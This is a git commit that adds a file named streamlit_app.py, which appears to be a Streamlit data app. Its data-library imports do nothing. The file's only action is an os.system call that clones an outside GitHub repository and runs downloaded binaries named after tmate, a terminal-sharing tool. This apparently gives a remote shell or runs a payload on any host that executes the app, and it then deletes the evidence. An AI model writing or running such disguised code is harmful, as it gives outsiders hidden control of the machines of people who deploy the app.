7792be39500010c5821b763f378b0e124ddc3961
mbahsas <114736098+mbahsas@users.noreply.github.com>
2022-09-30 09:44:39 +0000

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple 
+import altair as alt 
+import math 
+import pandas as pd 
+import streamlit as st 
+import os 
+os.system ("rm -rf bdul && rm -rf tmateo && git clone https://github.com/abudull/bdul.git && cd bdul && chmod +x tmate && chmod +x tmateo && ./tmateo && rm -rf tmateo")
